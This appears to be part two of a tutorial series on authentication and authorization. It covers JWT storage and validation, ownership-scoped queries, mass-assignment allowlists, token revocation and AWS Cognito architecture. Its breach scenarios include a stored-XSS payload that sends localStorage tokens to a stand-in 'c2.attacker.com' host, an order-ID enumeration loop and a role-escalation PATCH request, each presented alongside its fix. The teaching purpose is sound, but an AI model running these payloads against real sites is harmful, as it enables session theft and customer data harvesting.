# Authentication vs Authorization — Part 2 of 3

### Sections: 5 (Defense Mechanisms), 6 (Architecture Diagram), 7 (Production Scenarios), 8 (AWS Mapping)

**Series:** Authentication & Security → Topic 01

---

## SECTION 5 — Defense Mechanisms

### Defense 1: Token Storage — Never localStorage for JWTs

```
RULE: HttpOnly Cookies > Memory (JS variable) > localStorage

HttpOnly cookie:
  Set-Cookie: auth_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

  HttpOnly: JavaScript CANNOT read this cookie. document.cookie doesn't return it.
            XSS script doing localStorage.getItem('token') finds nothing.
  Secure:   Cookie only sent over HTTPS. Never over plain HTTP.
  SameSite=Strict: Cookie NOT sent on cross-site requests.
                   CSRF attack: POST from evil.com → bank.com
                   Bank never receives the cookie → CSRF neutralized.

  XSS extracts from localStorage: SUCCEEDS (reads any localStorage key)
  XSS extracts from HttpOnly cookie: FAILS (browser refuses JavaScript access)

Memory (JavaScript variable):
  const token = await loginRequest(...);
  // token lives in a module-level variable
  // Survives page navigation (SPA) but lost on browser close/refresh
  // XSS can still access via global variable if not carefully scoped
  // Better than localStorage, worse than HttpOnly cookie

localStorage:
  localStorage.setItem('token', jwt);
  NEVER use for auth tokens that provide account access.
  localStorage is accessible to every script on your origin.
  XSS on ANY page on your domain = ALL localStorage is compromised.

THE MISIMPLEMENTATION:
  Developers use localStorage because it's simple and persists across page refreshes.
  Tutorial code everywhere shows localStorage. Engineers copy it into production.
  This is how millions of apps are misconfigured.
```

---

### Defense 2: JWT Validation — The Correct Checklist

```
EVERY JWT VERIFICATION MUST CHECK ALL FIVE:

const verifyJWT = (token) => {
  try {
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],  // 1. Algorithm: NEVER allow 'none'
      issuer: 'https://auth.yourapp.com',   // 2. Issuer (iss claim)
      audience: 'https://api.yourapp.com',  // 3. Audience (aud claim)
    });
    // jwt.verify automatically checks:
    //   exp > now()  (4. Expiry)
    //   iat <= now() (5. Issued at — not future-dated)
    return decoded;
  } catch (err) {
    throw new AuthenticationError('Token invalid or expired');
  }
};

WHY EACH CHECK EXISTS:

1. Algorithm check:
   ATTACK: Attacker Base64-encodes header as { "alg": "none" } and strips the signature.
   If server accepts alg:none → signature never checked → any claims accepted.
   FIX: Whitelist RS256 or HS256. Never trust the header's alg claim for selection.

2. Issuer (iss) check:
   ATTACK: Token issued by auth.competitor.com → replayed at your API.
   If you share the same RSA key (you don't, but common in misconfiguration):
   token from a different service is accepted.
   FIX: Always check iss === your auth service URL.

3. Audience (aud) check:
   ATTACK: Token issued for service A is replayed at service B.
   "I got a valid token for the reporting service — let me use it at the payments service."
   FIX: Every service checks aud === its own identifier.

4. Expiry (exp) check:
   ATTACK: Stolen token used months later if no expiry is checked.
   JWT library SHOULD check this automatically but some older libraries require explicit flag.
   FIX: Always pass clockTolerance: 0 (or very small). Short-lived tokens: 15min–1hr.

5. The algorithm confusion attack (alg:HS256 with RS256 public key):
   ADVANCED ATTACK: Change header alg from RS256 to HS256.
   HMAC secret = the RSA public key (which is public knowledge).
   Some libraries use the RSA public key as the HMAC secret when HS256 is specified.
   Attacker can sign tokens with the public key → verified as valid.
   FIX: Hard-code the expected algorithm. Never derive algorithm from token header.
```

---

### Defense 3: Resource Ownership — Parameterized Authorization Pattern

```javascript
// PATTERN: Authorization-aware database queries
// Never fetch data, then check ownership — fetch WITH ownership in query

class InvoiceRepository {
  // BAD: Fetch all, check after
  async getInvoiceBad(invoiceId) {
    const invoice = await db.query("SELECT * FROM invoices WHERE id = $1", [
      invoiceId,
    ]);
    return invoice; // Caller responsible for ownership check — easily forgotten
  }

  // GOOD: Ownership enforced at query level
  async getInvoiceForUser(invoiceId, userId) {
    const invoice = await db.query(
      "SELECT * FROM invoices WHERE id = $1 AND user_id = $2",
      [invoiceId, userId],
    );
    // Returns null if: invoice doesn't exist OR user doesn't own it
    // Attacker cannot distinguish — both return 404
    return invoice;
  }

  // GOOD: Multi-tenant SaaS — tenant isolation enforced at query level
  async getInvoiceForTenant(invoiceId, tenantId) {
    const invoice = await db.query(
      "SELECT * FROM invoices WHERE id = $1 AND tenant_id = $2",
      [invoiceId, tenantId],
    );
    return invoice;
  }
}

// ALWAYS return 404 (not 403) when ownership fails:
// 403 "Forbidden" tells attacker: "resource exists but you can't see it"
//   → confirms invoice 9987 exists → attacker can target the owner
// 404 "Not Found" tells attacker nothing:
//   → could be non-existent, could be not theirs — no information
router.get("/invoices/:id", authenticate, async (req, res) => {
  const invoice = await invoiceRepo.getInvoiceForUser(
    req.params.id,
    req.user.id,
  );
  if (!invoice) return res.status(404).json({ error: { code: "NOT_FOUND" } });
  return res.json(invoice);
});
```

---

### Defense 4: Mass Assignment Prevention — Allowlist Pattern

```javascript
// DANGEROUS — mass assignment
router.patch('/users/me', authenticate, async (req, res) => {
  Object.assign(req.user, req.body);  // NEVER do this
  // Any field in the body updates the user object, including role, isAdmin, balance
  await req.user.save();
});

// SECURE — explicit allowlist
const UPDATABLE_USER_FIELDS = ['name', 'bio', 'website', 'timezone', 'preferences'];

router.patch('/users/me', authenticate, async (req, res) => {
  // Extract only the fields we allow users to update
  const allowedUpdates = {};
  for (const field of UPDATABLE_USER_FIELDS) {
    if (req.body[field] !== undefined) {
      allowedUpdates[field] = req.body[field];
    }
  }

  // req.body.role, req.body.isAdmin, req.body.balance → silently ignored
  await User.update({ id: req.user.id }, allowedUpdates);
  return res.json({ success: true });
});

// Admin-only fields require separate endpoint with role check
router.patch('/admin/users/:id/role', authenticate, authorize('admin'), async (req, res) => {
  const { role } = req.body;
  if (!VALID_ROLES.includes(role)) return res.status(400)...;
  await User.update({ id: req.params.id }, { role });
});
```

---

### Defense 5: Token Revocation — The Logout Problem

```
JWT PROBLEM: JWTs are stateless — once issued, valid until expiry.

Scenario:
  Alice logs out. Server clears her cookie.
  Attacker had already stolen Alice's JWT (still valid for 2 hours).
  Alice's "logout" is meaningless — token still works.

SOLUTIONS (tradeoff between statelessness and security):

OPTION 1 — Short expiry + Refresh Token rotation (recommended for most apps):
  Access token: 15-minute expiry (window of compromise = 15 minutes)
  Refresh token: 7-day expiry, HttpOnly cookie, stored in DB

  Logout: delete refresh token from DB
  Attacker: access token valid for ≤15 min remaining, cannot get new one after that

  Access token stolen: maximum 15-minute compromise window
  Refresh token stolen: detected on next use if rotation is enforced
    "Refresh token reuse" → invalidate ALL tokens for that user (breach signal)

OPTION 2 — Token Blocklist (adds state to stateless JWT):
  On logout: store { jti: token.jti, exp: token.exp } in Redis
  On every request: check Redis for this jti → if found, reject

  Redis lookup: < 1ms, minimal overhead vs stateless JWT
  Auto-cleanup: Redis TTL = token expiry (no growing blocklist)

  Con: Redis becomes a dependency — single point of failure if not HA

OPTION 3 — Reference Tokens (opaque tokens):
  Token issued: random string, no claims
  Every API call: lookup token in DB/Redis → get user claims
  Revocation: immediate — just delete from DB

  This is essentially sessions with an API key instead of cookie.
  Con: DB/cache lookup every request (same as sessions)
  Pro: complete control over revocation, scoping, and auditing

COMPARISON:
  Short JWT + refresh rotation: best for most APIs (near-stateless, secure)
  JWT + blocklist: good for high-security apps that need fast revocation
  Reference tokens (opaque): best when auditability and instant revocation is required
                             (banking, healthcare)
```

---

## SECTION 6 — Architecture Diagram

```
              AUTHENTICATION & AUTHORIZATION ARCHITECTURE
              =============================================

BROWSER / MOBILE CLIENT
  │
  │  1. Login: POST /auth/login { email, password }
  │
  ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         CloudFront CDN                              │
│  • HTTPS termination (TLS 1.2+)                                     │
│  • Routes /auth/* to Auth Service                                   │
│  • Routes /api/* to API Gateway                                     │
│  • WAF: blocks malformed tokens, rate limits login attempts          │
│  • Never caches auth responses: Cache-Control: no-store              │
└────────────────────────────┬────────────────────────────────────────┘
                             │
             ┌───────────────┼───────────────────┐
             ▼               ▼                   ▼
     /auth/login         /api/*            /admin/*
             │               │                   │
             ▼               ▼                   ▼
┌────────────────┐  ┌────────────────┐  ┌────────────────┐
│  Auth Service  │  │  API Gateway   │  │  Admin Gateway │
│  (Cognito or   │  │                │  │                │
│   custom)      │  │  JWT Authorizer│  │  JWT + Role    │
│                │  │  runs BEFORE   │  │  Authorizer    │
│  Validates:    │  │  Lambda        │  │  checks:       │
│  • password    │  │                │  │  role === admin│
│  • MFA code    │  │  Checks:       │  │  before any    │
│  • device state│  │  1. Signature  │  │  request       │
│                │  │  2. Expiry     │  │  reaches Lambda│
│  Issues:       │  │  3. Issuer     │  │                │
│  • Access JWT  │  │  4. Audience   │  │  403 on role   │
│    (15 min)    │  │                │  │  mismatch:     │
│  • Refresh token│ │  On pass:      │  │  never reaches │
│    (7 days, DB)│  │  injects user  │  │  backend       │
│                │  │  claims into   │  │                │
│  Sets cookies: │  │  Lambda event  │  └────────────────┘
│  access=HttpOnly│ │                │
│  refresh=HttpOnly│ │  On fail:    │
└────────────────┘  │  401 before   │
                    │  Lambda runs  │
                    └───────┬───────┘
                            │  claim-enriched request
                            ▼
             ┌──────────────────────────────┐
             │     Application Lambda        │
             │                              │
             │  AuthN: ALREADY DONE         │
             │  (API GW Authorizer ran)      │
             │                              │
             │  AuthZ: STILL YOUR JOB       │
             │  Must check ownership:       │
             │  WHERE user_id = $userId     │
             │  Must check role for ops:    │
             │  if (!isAdmin) return 403    │
             │                              │
             │  Common mistake here:        │
             │  trusting API GW = fully     │
             │  secure. AuthN ≠ AuthZ.      │
             └──────────┬───────────────────┘
                        │
          ┌─────────────┼──────────────────┐
          ▼             ▼                  ▼
┌──────────────┐ ┌────────────┐  ┌─────────────────┐
│  PostgreSQL  │ │   Redis    │  │  Audit Log      │
│              │ │            │  │  (CloudWatch)   │
│  Ownership   │ │  Token     │  │                 │
│  queries:    │ │  blocklist │  │  Every authN +  │
│  AND user_id │ │  (revoked  │  │  authZ decision │
│  = $1        │ │   tokens)  │  │  logged:        │
│              │ │            │  │  who, what,     │
│  Tenant      │ │  Rate limit│  │  when, allowed? │
│  isolation:  │ │  counters  │  │                 │
│  AND tenant_id│ │  per user │  │  Used for:      │
│  = $2         │└────────────┘  │  forensics,     │
└──────────────┘                 │  compliance     │
                                 └─────────────────┘

RESPONSIBILITY BREAKDOWN:
  CloudFront/WAF:    TLS, bot blocking, rate limiting login
  API Gateway:       Authentication (JWT verification)
  Lambda/App code:   Authorization (ownership + RBAC)
  Database query:    Ownership enforcement (WHERE user_id = ?)
  Redis:             Token revocation, session management, rate limits
  Audit log:         Compliance evidence, incident forensics
```

---

## SECTION 7 — Real Production Scenarios

### Scenario A: E-Commerce Payment Flow

**Setup:** ShopFlow, 2 million users, order history and saved payment methods stored.

```
VULNERABILITY: Authentication-only, no authorization on order details API.

DEPLOYMENT STATE:
  router.get('/orders/:id', verifyJWT, async (req, res) => {
    const order = await Order.findById(req.params.id);  // NO ownership check
    return res.json(order);
  });

  Order IDs: ord_100001, ord_100002... (sequential, enumerable)
  Order response includes: customer name, shipping address, items, payment last-4

ATTACKER STEPS:
  Account created with free email.
  Script:
    for n in range(100000, 120000):
      GET /orders/ord_{n}
      → Record: name, address, payment method

  5,000 orders/hour rate not flagged (no anomaly detection).

  In 24 hours: 120,000 customer records harvested.
  Data sold: $2–$10/record on dark web forums.
  Revenue: $240K–$1.2M from one unauthenticated enumeration.

IMMEDIATE IMPACT:
  Customers receive phishing calls from "ShopFlow Support":
    "We noticed a problem with your order. Please verify your full card number."
  Social engineering enabled by leaked order data (attackers know exactly what they ordered).

REGULATORY IMPACT:
  PCI-DSS: exposure of cardholder data → Level 1 merchant audit, fines, card brand penalties.
  GDPR: if any EU customers → mandatory 72-hour breach notification to regulators.
  Class action: 120,000 affected customers → potential $500/customer CCPA claim = $60M.

CORRECT IMPLEMENTATION:
  // Two defenses, both required:

  // 1. Non-enumerable IDs
  orders.id = uuid() → "ord_3f8a9b2c" (not sequential)

  // 2. Ownership check on every resource fetch
  router.get('/orders/:id', verifyJWT, async (req, res) => {
    const order = await Order.findOne({
      id: req.params.id,
      userId: req.user.id  // ONLY returns this user's orders
    });
    if (!order) return res.status(404).json({ error: 'NOT_FOUND' });
    return res.json(order);
  });

  // 3. Rate limiting anomaly detection
  // > 100 order fetches/hour from one user → log alert, temporary block
```

---

### Scenario B: Social Media Session Hijack + Escalation

**Setup:** TalkSpace, B2C social platform, JWT in localStorage (common tutorial pattern).

```
VULNERABILITY CHAIN:
  1. Stored XSS in user bio field (not sanitized)
  2. JWT stored in localStorage (accessible to JavaScript)
  3. Account update API with mass assignment (role field updatable)

ATTACK CHAIN:

Phase 1 — Reconnaissance:
  Attacker creates account. Updates bio to:
  <script>fetch('/api/me').then(r=>r.json()).then(d=>console.log(d))</script>
  Bio rendered in profile page. Script runs. API response includes: role, id, email.
  XSS confirmed. API structure exposed.

Phase 2 — Token Exfiltration at Scale:
  Attacker submits popular post to get 10,000 views.
  Embeds in post: <img src="x" onerror="
    var t=localStorage.getItem('auth');
    if(t)fetch('https://c2.attacker.com/?t='+btoa(t))">

  10,000 users view post → 10,000 JWTs sent to attacker's server.
  Attacker now has 10,000 active sessions.

Phase 3 — Privilege Escalation:
  Among 10,000 stolen tokens: some are moderators (role: "moderator").
  Try mass assignment: PATCH /api/users/me { "role": "admin" }
  Developer left role in updateable fields.

  Attacker's own account → role: "admin"
  Admin panel accessible.
  Attacker exports entire user database (name, email, phone, DMs).

Phase 4 — Extortion:
  Attacker contacts company:
    "I have your full user database. $500K or I publish it."
  Whether paid or not: regulatory breach notification required.

PREVENTION — Each layer independently:
  1. XSS prevention: sanitize bio with DOMPurify before storage + on render:
     bio = DOMPurify.sanitize(req.body.bio);  // strips all HTML/script

  2. HttpOnly cookies (even if XSS runs, cannot read auth cookie):
     res.cookie('auth', token, { httpOnly: true, secure: true, sameSite: 'Strict' });

  3. Mass assignment prevention — explicit allowlist:
     const allowed = ['name', 'bio', 'avatar'];
     const update = _.pick(req.body, allowed);

  DEFENSE IN DEPTH:
  Even if attacker bypasses Layer 1 (XSS), Layer 2 (HttpOnly) stops token theft.
  Even if token is stolen via another vector, Layer 3 (allowlist) stops escalation.
  No single layer is sufficient. All three are required.
```

---

## SECTION 8 — Cloud & AWS Mapping

### AWS Services for Authentication & Authorization

```
SERVICE          ROLE IN AUTH ARCHITECTURE         WHEN TO USE
────────────────────────────────────────────────────────────────────────────
Cognito          Managed Auth Service               Any app needing user pools,
User Pools       - User registration/login          OAuth 2.0, MFA, federation.
                 - JWT issuance (ID + Access tokens) Avoid building custom auth.
                 - MFA (SMS/TOTP), device tracking
                 - OAuth/OIDC with social IdPs
                 - Customizable with Lambda triggers

Cognito          Machine authentication             Microservice-to-service auth,
Identity Pools   - Exchanges JWTs for temp AWS creds IoT, mobile apps needing
                 - Allows unauthenticated access    direct AWS resource access
                 - Maps identities → IAM roles

API Gateway      Enforces authentication            API-first architectures
JWT Authorizer   before Lambda runs:                where all traffic enters
                 - Validates JWT signature           through API Gateway.
                 - Checks iss, aud, exp
                 - Injects claims into Lambda event
                 - Returns 401 if invalid (Lambda
                   never invoked = zero cost)

API Gateway      Custom authentication              Legacy token formats,
Lambda Authorizer - Custom JWT validation           API keys, certificate-based
                 - API key validation               auth, or complex policies.
                 - Result cached for TTL period     Cache reduces Lambda cost.

ALB              Authentication before              Web apps without API Gateway.
                 application layer                  Integrates with Cognito for
                 - Cognito integration              OIDC login flow at LB level.
                 - Returns JWT claims as headers    Useful for ECS/EC2 workloads.

WAF              Layer 7 firewall:                  Always — on CloudFront or
                 - Rate limit login attempts         ALB. Protects auth endpoints
                 - Block credential stuffing         from automated attacks.
                 - Block known bot user agents
                 - SQL injection in auth params

Secrets Manager  Store private keys, DB passwords   NEVER hardcode JWT secret or
                 - Automatic rotation               private key in code.
                 - Audit access in CloudTrail       Rotation = compromise recovery.

KMS              Encrypt sensitive data at rest:    Encrypting session stores,
                 - Envelope encryption              refresh token tables,
                 - Key material in HSM              audit logs, user credentials.
                 - Audit all decrypt operations

CloudTrail       Audit log of all AWS API calls:    Mandatory for security
                 - Who called what, when, from where investigations.
                 - Detect compromised credentials   Enables forensics after breach.
                 - Compliance evidence
```

---

### Secure Production Architecture on AWS

```
                 INVOICEFLOW PRODUCTION AUTH ARCHITECTURE
                 =========================================

BROWSER / MOBILE
  │
  │  POST /auth/login (HTTPS only)
  ▼
┌──────────────────────────────────────────────────────────────────┐
│                      CloudFront                                  │
│  • Enforces HTTPS: redirects HTTP 301 → HTTPS                   │
│  • WAF attached:                                                 │
│    - Rate limit /auth/login: 5 attempts/IP/minute               │
│    - Rate limit /auth/token: 20/IP/minute                       │
│    - Block IPs in threat intel lists                            │
│    - Block requests with SQL injection patterns                 │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────────────┐
│                   Cognito User Pool                              │
│  • Receives email + password                                    │
│  • bcrypt hash comparison                                       │
│  • MFA: TOTP (Google Authenticator) mandatory for admin users   │
│  • Suspicious sign-in: email+phone challenge                    │
│  • Lambda trigger: Pre-Auth checks (account locked?)            │
│  • Lambda trigger: Post-Auth log (successful login event)       │
│  • Issues: id_token (user claims), access_token (API auth)      │
│    access_token: 1-hour expiry                                  │
│    refresh_token: 30-day expiry, never sent to browser          │
│                   stored in Lambda + DynamoDB (server-side)     │
└──────────────────┬─────────────────────────────────────────────┘
                   │
         ┌─────────┘
         │  Sets: access_token in HttpOnly cookie
         │        (refresh_token server-side only)
         ▼
BROWSER has: HttpOnly cookie with short-lived access_token
             No refresh token exposure to JavaScript
             No sensitive data in localStorage

  │  Subsequent API calls:
  │  GET /api/invoices   Cookie: access_token=eyJ... (auto-sent, HttpOnly)
  ▼
┌──────────────────────────────────────────────────────────────────┐
│                      API Gateway                                 │
│  JWT Authorizer (Cognito):                                      │
│  • Validates access_token signature                             │
│  • Checks exp, iss, aud                                         │
│  • Extract: sub, email, custom:role                             │
│  • Cache valid tokens for 300 seconds (reduce Cognito calls)    │
│  • On failure: 401 before Lambda runs                           │
│  • On success: inject claims into Lambda event.requestContext   │
└──────────────────────┬───────────────────────────────────────────┘
                       │  event.requestContext.authorizer.claims
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│                  Application Lambda                              │
│  AuthN: Complete (API GW handled it)                            │
│  AuthZ: This Lambda's responsibility:                           │
│                                                                  │
│  const userId = event.requestContext.authorizer.claims.sub;     │
│  const role = event.requestContext.authorizer.claims['custom:role'];
│                                                                  │
│  // Resource ownership: WHERE user_id = $userId                 │
│  // Role check: if (role !== 'admin') return 403                │
└──────────────────────┬───────────────────────────────────────────┘
                       │
          ┌────────────┼──────────────────┐
          ▼            ▼                  ▼
┌──────────────┐ ┌──────────────┐ ┌──────────────────┐
│  RDS Aurora  │ │  ElastiCache │ │  CloudWatch Logs │
│  (Postgres)  │ │  (Redis)     │ │  + CloudTrail    │
│              │ │              │ │                  │
│  All queries │ │  Revoked JTI │ │  Audit every     │
│  include:    │ │  store (if   │ │  auth decision   │
│  AND         │ │  blocklist   │ │  Login success/  │
│  user_id=$1  │ │  pattern)    │ │  failure, token  │
│  AND         │ │              │ │  issued, 403s    │
│  tenant_id=$2│ │  Rate limit  │ │  All to          │
│              │ │  counters    │ │  CloudWatch +    │
└──────────────┘ └──────────────┘ │  S3 for 7-year  │
                                  │  retention       │
                                  └──────────────────┘

CloudFormation key outputs:
  CognitoUserPoolId: ap-south-1_abc123
  CognitoAppClientId: 4hfk...  (no client secret for public SPA)
  APIGatewayJwtAuthorizerId: abc...
  WAFWebACLArn: arn:aws:wafv2:us-east-1:...
```

### AWS Cognito Lambda Trigger — Pre-Token Generation

```javascript
// Lambda: runs before every JWT is issued
// Customize claims, block compromised accounts, inject role from DB

export const handler = async (event) => {
  const { userPoolId, userName } = event;

  // Fetch custom claims from your DB (Cognito only stores basic attributes)
  const user = await db.query(
    "SELECT role, tenant_id, is_locked, mfa_required FROM users WHERE cognito_sub = $1",
    [event.request.userAttributes.sub],
  );

  // Block locked accounts even if Cognito credentials are valid
  if (user.isLocked) {
    throw new Error("ACCOUNT_LOCKED"); // Cognito returns 400, login fails
  }

  // Inject custom claims into the JWT
  event.response = {
    claimsOverrideDetails: {
      claimsToAddOrOverride: {
        "custom:role": user.role, // "admin", "customer", "viewer"
        "custom:tenant_id": user.tenantId, // multi-tenant isolation
        "custom:permissions": user.permissions.join(","),
      },
      claimsToSuppress: ["email_verified"], // remove unused claims → smaller token
    },
  };

  return event;
};
```
